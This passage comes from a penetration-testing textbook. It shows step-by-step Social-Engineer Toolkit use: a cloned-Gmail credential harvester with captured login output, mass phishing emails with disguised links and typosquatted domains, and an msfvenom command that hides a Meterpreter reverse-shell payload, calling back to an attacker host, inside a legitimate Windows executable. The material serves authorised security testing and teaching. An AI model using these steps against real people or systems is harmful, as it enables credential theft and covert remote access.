3) Credential Harvester Attack Method
4) Tabnabbing Attack Method
--snip--
99) Return to Main Menu
set:webattack> 3
Listing 11-11: SET website attacks
Here’s a description of some of the attacks:
• The Java Applet Attack Method automates the Java-signed applet attack
we used in Chapter 10.
• The Metasploit Browser Exploit Method allows you to use all of
Metasploit’s browser-exploitation client-side attacks without having
to set parameters manually, by knowing Metasploit syntax.
250 Chapter 11
• The Credential Harvester Attack Method helps create websites to trick
users into giving up their credentials.
• The Tabnabbing Attack Method relies on users’ propensity to build
up a collection of open browser tabs. When the user first opens the
attack page, it says “Please wait.” Naturally, the user switches back to
another tab while he waits. Once the attack tab is no longer in focus, it
loads the attack site (which can be a clone of any website you like), with
the goal of tricking the user into supplying his credentials or otherwise
interacting with the malicious site. The assumption is that the user will
use the first tab he encounters that looks legitimate.
Choose option 3, the Credential Harvester Attack Method.
Next you should see a prompt asking what sort of website you would
like. We can choose from some prebuilt web templates, clone a website from
the Internet with Site Cloner, or import a custom web page with Custom
Import. Choose option 1 to use a SET template (see Listing 11-12).
1) Web Templates
2) Site Cloner
3) Custom Import
--snip--
99) Return to Webattack Menu
set:webattack> 1
Listing 11-12: SET website template options
Now enter the IP address for the website to post credentials back to. We
can just use the local IP address for the Kali virtual machine, but if you use
this attack against a client, you will need an Internet-facing IP address.
IP Address for the POST back in Harvester: 192.168.20.9
Now choose a template. Because we want to trick users into enter-
ing their credentials, choose a template with a login field, such as Gmail
(option 2), as shown in Listing 11-13. SET should now start a web server
with our fake Gmail page, a clone of the actual Gmail page.
1. Java Required
2. Gmail
3. Google
4. Facebook
5. Twitter
6. Yahoo
set:webattack> Select a template: 2
[*] Cloning the website: https://gmail.com
[*] This could take a little bit...
Social Engineering 251
The best way to use this attack is if the username and password form fields
are available. Regardless, this captures all POSTs on a website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
Listing 11-13: Setting up the site
Now browse to the cloned Gmail site at the Kali Linux web server and
enter some credentials to see how this works. After entering credentials you
should be redirected to the real Gmail site. To a user it will just seem like he
typed in his password incorrectly. In the meantime, back in SET, you should
see a result that looks something like Listing 11-14.
192.168.20.10 - - [10/May/2015 12:58:02] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
PARAM: ltmpl=default
--snip--
PARAM: GALX=oXwT1jDgpqg
POSSIBLE USERNAME FIELD FOUND: Email=georgiau
POSSIBLE PASSWORD FIELD FOUND: Passwd=passwordv
--snip--
PARAM: asts=
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
Listing 11-14: SET capturing credentials
When the user submits the page, SET highlights the fields that it thinks
are interesting. In this case, it found the Email u and Passwd v that were
submitted. Once you shut down the web server with ctrl-C to end the web
attack, the results should be written to a file.
When combined with the email attack discussed next, this is a great
attack to use to gather credentials for a pentest or, at the very least, test the
security awareness of your client’s employees.
Note that this attack can be even more interesting if you use option 5,
Site Cloner, to make a copy of your customer’s site. If they do not have a
page with a login form of some sort (VPN, webmail, blogging, and so on)
you can even create one. Clone their site, and add a simple HTML form
like this:
Username: 
Password: 
Then use option 3, Custom Import, to have SET serve your modified page.
252 Chapter 11
mass email attacks
Now to use SET to automate phishing email attacks. Create a file and enter
a few email addresses, one per line, as shown here.
root@kali:~# cat emails.txt
PI:EMAIL
PI:EMAIL
PI:EMAIL
Now return to the main SET Social-Engineering Attacks menu with
option 99 (List ing 11-2) and choose option 5, Mass Mailer Attack. Large car-
bon copy or blind carbon copy lists can trigger spam filters or tip off users
that something is amiss, and emailing a long list of client employees individ-
ually by hand can be tedious, so we’ll use SET to email multiple addresses
(see Listing 11-15). Scripts are good for repetitive tasks like this.
set> 5
1. E-Mail Attack Single Email Address
2. E-Mail Attack Mass Mailer
--snip--
99. Return to main menu.
set:mailer> 2
--snip--
set:phishing> Path to the file to import into SET: /root/emails.txtu
Listing 11-15: Setting up an email attack
Choose option 2 and enter the name of the email address file to
import u.
Next we need to choose a server (see Listing 11-16). Let’s use Gmail
again—option 1. When prompted, enter your credentials.
1. Use a gmail Account for your email attack.
2. Use your own server or open relay
set:phishing> 1
set:phishing> Your gmail email address: PI:EMAIL
set:phishing> The FROM NAME the user will see: Georgia Weidman
Email password:
set:phishing> Flag this message/s as high priority? [yes|no]: no
Listing 11-16: Logging in to Gmail
You should be asked to create the email to send, as shown in Listing 11-17.
set:phishing> Email subject: Company Web Portal
set:phishing> Send the message as html or plain? 'h' or 'p': hu
[!] IMPORTANT: When finished, type END (all capital) then hit {return} on a new line.
set:phishing> Enter the body of the message, type END (capitals) when finished: All
Social Engineering 253
Next line of the body:
Next line of the body: We are adding a new company web portal. Please go to http://www.bulbsecurity.com/webportal and use your Windows domain
credentials to log in.
Next line of the body:
Next line of the body: Bulb Security Administrator
Next line of the body: END
[*] Sent e-mail number: 1 to address: PI:EMAIL
[*] Sent e-mail number: 2 to address: PI:EMAIL
[*] Sent e-mail number: 3 to address: PI:EMAIL
[*] Sent e-mail number: 4 to address:
[*] SET has finished sending the emails
Press  to continue
Listing 11-17: Sending the email
When asked whether to make the email plaintext or HTML, choose h
for HTML u. By using HTML for the email, we’ll be better able to hide the
real destination of the links in the email behind graphics and such.
Now to enter the text for the email. Because we chose HTML as the
email format, we can use HTML tags in our email. For example, this code
creates a link for the recipient to click: http://www
.bulbsecurity.com/webportal. The text displayed indicates that the link
goes to http://www.bulbsecurity.com/webportal, but the link will really open
192.168.20.9 in the browser. We control the website at 192.168.20.9, so we
can put a browser exploit or a phishing attack there. Add some text to the
email to convince users to click the included link. This is where you can be
particularly creative. For example, in Listing 11-17, we inform the users that
a new company portal has been added, and they should log in with their
domain credentials to check it out. On a pentest, a better way to approach
this would be to register a variation of the company’s domain name
(bulb-security.com) or perhaps use a slight misspelling (bulbsecurty.com)
that is likely to go unnoticed by users and host your social-engineering
site there.
After you finish the email, press ctrl-c to send it. The email will be
sent to each address in the emails.txt file we entered earlier.
Recipients will see this email:
All,
We are adding a new company web portal. Please go to http://
www.bulbsecurity.com/webportal and use your Windows domain
credentials to log in.
Bulb Security Administrator
While a security-savvy user should know better than to click links in
emails that are not from a trusted source, and would know how to verify
where a link points to before clicking it, not all users are that savvy, and
even the savvy ones aren’t always paying attention. In fact, I have never
launched a social-engineering test that failed.
254 Chapter 11
multipronged attacks
Let’s combine our previous two attacks (credential harvesting and phishing
emails) to trick employees into submitting their credentials to a pentester-
controlled site. We’ll use an email attack together with a web attack to send
users to our attacker-controlled site by tricking them into clicking links in
the emails.
But first we need to change an option in SET’s configuration file. In
Kali this file is at /usr/share/set/config/set_config. The option to change is
WEB_ATTACK_EMAIL, which by default is set to OFF. Open the config file in a text
editor and change this option to ON.
### Set to ON if you want to use Email in conjunction with webattack
WEBATTACK_EMAIL=ON
Now try running the Credential Harvesting attack again. Instead of
using a template, you can clone one of your client’s web pages if they have
a login site, such as webmail or an employee portal. If the client uses a web
page and not a login site, use the Custom Import option to build your own page
that looks like the employee’s web page with a login form added.
summary
In this chapter we’ve looked at only a couple of social-engineering attacks
that we can automate with SET. The scripts for your attacks will change
based on your clients’ needs. Some clients may have a specific attack sce-
nario in mind, or you may find the need to run multiple attacks at once. For
instance, you may create a multipronged attack where you harvest creden-
tials and the malicious website runs a malicious Java applet. In addition to
the web-based attacks and malicious files we looked at here, SET can cre-
ate other attacks, such as USB sticks, QR codes, and rogue wireless access
points.
Social Engineering 255
12
BYPassing antiVirus
aPPliCations
Your pentesting clients will most likely be running
some sort of antivirus solution. So far in this book
we’ve avoided having any of our malicious executables
deleted by antivirus applications, but antivirus program
avoidance is a constantly changing field. Typically you
will be more likely to avoid detection by using a memory-corruption exploit
and loading your payload directly into memory—that is, by never touching
the disk. That said, with the attack landscape shifting to emphasize client-
side and social-engineering attacks, it may not always be possible to avoid
writing your payload to disk. In this chapter we’ll look at a few techniques
for obscuring our malware to try to avoid detection when the payload is
written to the disk.
trojans
In Chapter 4, we created a standalone malicious executable that runs a
Metasploit payload. Though we may be able to use social engineering to
trick a user into downloading and running our malicious file, the lack of
any functionality other than our executable’s payload could tip off users
that something is amiss. We’d be much more likely to evade detection if we
could hide our payload inside of some legitimate program that would run
normally, with our payload running in the background. Such a program
is called a trojan, after the legendary wooden horse that ended the Trojan
War. The horse appeared to be an innocuous offering to the gods and was
brought inside the previously impenetrable walled city of Troy, with enemy
soldiers hiding inside, ready to attack.
We encountered a trojan in Chapter 8: The Vsftpd server on our Ubuntu
target had a backdoor that could be triggered at login by entering a smiley
face as part of the username. Attackers compromised the source code reposi-
tories for Vsftpd and added additional trojan functionality to the program.
Anyone who downloaded Vsftpd from the official repositories between the
initial compromise and detection ended up with a trojaned version.
Msfvenom
Although reverse-engineering binaries or gaining access to source code
and manually adding trojan code is beyond the scope of this book, the
Msfvenom tool has some options we can use to embed a Metasploit payload
inside a legitimate binary. Listing 12-1 shows some important options we
have not encountered previously in the text.
root@kali:~# msfvenom -h
Usage: /opt/metasploit/apps/pro/msf3/msfvenom [options] 
Options:
-p, --payload [payload] Payload to use. Specify a '-' or stdin to
use custom payloads
--snip--
u-x, --template [path] Specify a custom executable file to use
as a template
v-k, --keep Preserve the template behavior and inject
the payload as a new thread
--snip--
Listing 12-1: Msfvenom help page
In particular, the -x flag u allows us to use an executable file as a
template in which to embed our chosen payload. However, though the
resulting executable will look like the original one, the added payload will
pause the execution of the original, and we shouldn’t expect a user to run
258 Chapter 12
an executable that appears to hang at startup very many times. Luckily,
Msfvenom’s -k flag v will keep the executable template intact and run our
payload in a new thread, allowing the original executable to run normally.
Let’s use the -x and -k flags to build a trojaned Windows executable
that will appear normal to a user but which will send us a Meterpreter ses-
sion in the background. To do so, we choose the payload with the -p flag
and set the relevant payload options as in Chapter 4. Any legitimate execut-
able will do; you’ll find some useful Windows binaries for pentesting in Kali
Linux at /usr/share/windows-binaries.
To embed our payload inside the radmin.exe binary enter:
root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9
LPORT=2345 -x /usr/share/windows-binaries/radmin.exe -k -f exe > radmin.exe
Our Msfvenom command specifies the payload to generate with the
-p option. We set the LHOST option to the IP address of Kali, the system to
call back to when the payload runs. We can also set the LPORT option. As
discussed in this section, the -x option selects an executable in which to
embed our payload. The -k option runs the payload in a separate thread.